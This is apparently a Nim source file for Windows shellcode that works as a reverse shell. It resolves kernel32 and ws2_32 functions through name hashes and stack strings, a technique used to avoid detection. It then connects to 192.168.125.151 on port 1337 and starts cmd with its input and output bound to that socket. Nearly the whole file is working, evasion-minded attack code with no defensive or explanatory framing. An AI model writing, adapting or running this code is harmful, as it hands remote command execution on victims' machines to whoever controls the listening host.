import winim
import utils/[getmodulehandle, getprocaddress, hash, str]

# declaring needed functions
type LoadLibraryA   = (proc(lpLibFileName: LPCSTR): HMODULE {.stdcall.})
type WSAStartup     = (proc(wVersionRequested: WORD, lpWSAData: LPWSADATA): int32 {.stdcall.})
type WSASocketA     = (proc(af: int32, `type`: int32, protocol: int32, lpProtocolInfo: LPWSAPROTOCOL_INFOA, g: GROUP, dwFlags: DWORD): SOCKET {.stdcall.})
type inet_addr      = (proc(cp: ptr char): int32 {.stdcall.})
type htons          = (proc(hostshort: uint16): uint16 {.stdcall.})
type connect        = (proc(s: SOCKET, name: ptr sockaddr, namelen: int32): int32 {.stdcall.})
type CreateProcessA = (proc(lpApplicationName: LPCSTR, lpCommandLine: LPSTR, lpProcessAttributes: LPSECURITY_ATTRIBUTES, lpThreadAttributes: LPSECURITY_ATTRIBUTES, bInheritHandles: WINBOOL, dwCreationFlags: DWORD, lpEnvironment: LPVOID, lpCurrentDirectory: LPCSTR, lpStartupInfo: LPSTARTUPINFOA, lpProcessInformation: LPPROCESS_INFORMATION): WINBOOL {.stdcall.})

proc main() {.asmNoStackFrame.} =
  asm """
    and rsp, 0xfffffffffffffff0
    mov rbp, rsp
    sub rsp, 0x400    # allocate stack space, arbitrary size ... depends on payload
  """

  var 
    sHost {.stackStringA.} = "192.168.125.151"
    port: uint16 = 1337
    wsaData: WSADATA
    sCmd {.stackStringA.} = "cmd"

  var
    sws2_32 {.stackStringA.} = "ws2_32.dll"
    sLoadLibraryA   = static(hashSdmb("LoadLibraryA"))
    sWSAStartup     = static(hashSdmb("WSAStartup"))
    sWSASocketA     = static(hashSdmb("WSASocketA"))
    sinet_addr      = static(hashSdmb("inet_addr"))
    shtons          = static(hashSdmb("htons"))
    sconnect        = static(hashSdmb("connect"))
    sCreateProcessA = static(hashSdmb("CreateProcessA"))
  
  var 
    hKernel32 = locateKernel32()
    pLoadLibraryA = cast[LoadLibraryA](custom_GetProcAddressHash(hKernel32, sLoadLibraryA))
    hws2_32 = pLoadLibraryA(cast[cstring](addr sws2_32[0]))
    pWSAStartup = cast[WSAStartup](custom_GetProcAddressHash(hws2_32, sWSAStartup))
    pWSASocketA = cast[WSASocketA](custom_GetProcAddressHash(hws2_32, sWSASocketA))
    pinet_addr = cast[inet_addr](custom_GetProcAddressHash(hws2_32, sinet_addr))
    phtons = cast[htons](custom_GetProcAddressHash(hws2_32, shtons))
    pconnect = cast[connect](custom_GetProcAddressHash(hws2_32, sconnect))
    pCreateProcessA = cast[CreateProcessA](custom_GetProcAddressHash(hKernel32, sCreateProcessA))

  #[ Actual Code starts here ]#
  # call WSAStartup
  var wsaStartupRes = pWSAStartup(MAKEWORD(2,2), addr wsaData)

  # call WSASocket
  var socket = pWSASocketA(2, 1, 6, NULL, cast[GROUP](0), cast[DWORD](NULL))

  # create sockaddr_in struct
  var sa: sockaddr_in
  sa.sin_family = AF_INET
  sa.sinaddr.S_addr = pinet_addr(cast[cstring](addr sHost[0]))
  sa.sin_port = phtons(port)

  # call connect
  var connectResult = pconnect(socket, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))

  # call CreateProcessA
  var 
    si: STARTUPINFO
    pi: PROCESS_INFORMATION
  si.cb = cast[DWORD](sizeof(si))
  si.dwFlags = STARTF_USESTDHANDLES
  si.hStdInput = cast[HANDLE](socket)
  si.hStdOutput = cast[HANDLE](socket)
  si.hStdError = cast[HANDLE](socket)

  discard pCreateProcessA(
    NULL,
    cast[LPSTR](addr sCmd[0]),
    NULL,
    NULL,
    TRUE,
    0,
    NULL,
    NULL,
    cast[LPSTARTUPINFOA](addr si),
    addr pi
  )


when isMainModule:
  main()